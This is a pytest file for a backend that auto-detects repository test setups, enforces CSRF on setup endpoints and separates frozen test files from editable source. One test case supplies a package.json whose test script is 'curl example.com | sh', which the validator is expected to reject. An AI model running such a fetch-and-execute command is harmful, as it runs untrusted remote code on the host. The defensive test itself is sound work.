import pytest
from fastapi import HTTPException
from fastapi.testclient import TestClient
from backend.repository_detection import detect_configuration
from test_repository_setup import configured, HEADERS, Runner
from test_github_auth import seed


def test_npm_detection_freezes_tests_and_excludes_generated_and_hidden_files():
    config = detect_configuration(['package.json', 'package-lock.json', 'tests/math.test.ts',
        'vitest.config.ts', 'src/math.ts', '.env', 'node_modules/other.ts', 'dist/math.js'],
        {'scripts': {'test': 'vitest run'}})
    assert config.editable_files == ['src/math.ts']
    assert set(config.test_files) == {'package.json', 'package-lock.json', 'tests/math.test.ts', 'vitest.config.ts'}


@pytest.mark.parametrize('paths,package', [
    (['src/math.py'], None),
    (['package.json', 'package-lock.json', 'tests/math.test.js', 'src/math.js'], {'scripts': {'test': 'curl example.com | sh'}}),
    (['package.json', 'tests/math.test.js', 'src/math.js'], {'scripts': {'test': 'node --test'}}),
])
def test_ambiguous_or_unsupported_detection_requires_manual_setup(paths, package):
    with pytest.raises(HTTPException) as exc:
        detect_configuration(paths, package)
    assert exc.value.status_code == 422


def test_automatic_setup_requires_csrf_and_validation_before_ready(tmp_path, monkeypatch):
    app = configured(tmp_path, monkeypatch)
    with TestClient(app) as client:
        seed(app, 'github:1', 'session1')
        client.cookies.set('torque_session', 'session1')
        endpoint = '/api/repositories/source/demo/setup/automatic'
        assert client.post(endpoint).status_code == 403
        response = client.post(endpoint, headers=HEADERS)
        assert response.status_code == 202
        assert response.json()['status'] == 'validating'
        request_id = Runner.request_id
        assert client.post(endpoint, headers=HEADERS).json()['status'] == 'validating'
        assert Runner.request_id == request_id
        assert client.get('/api/repositories/source/demo/setup').json()['status'] == 'ready'
        assert client.get('/api/auth/github/repositories').json()['repositories'][0]['run_supported']


def test_large_source_inventory_no_longer_requires_user_file_selection():
    config = detect_configuration(['tests/test_math.py'] + [f'src/file{i}.py' for i in range(40)])
    assert config.test_files == ['tests/test_math.py']
    assert len(config.editable_files) == 10


def test_manual_test_setup_does_not_require_edit_paths(tmp_path, monkeypatch):
    app = configured(tmp_path, monkeypatch)
    with TestClient(app) as client:
        seed(app, 'github:1', 'session1')
        client.cookies.set('torque_session', 'session1')
        response = client.post('/api/repositories/source/demo/setup', headers=HEADERS,
                               json={'framework':'pytest', 'test_files':['tests/test_math.py']})
        assert response.status_code == 202
        assert response.json()['configuration']['editable_files'] == ['src/math.py']
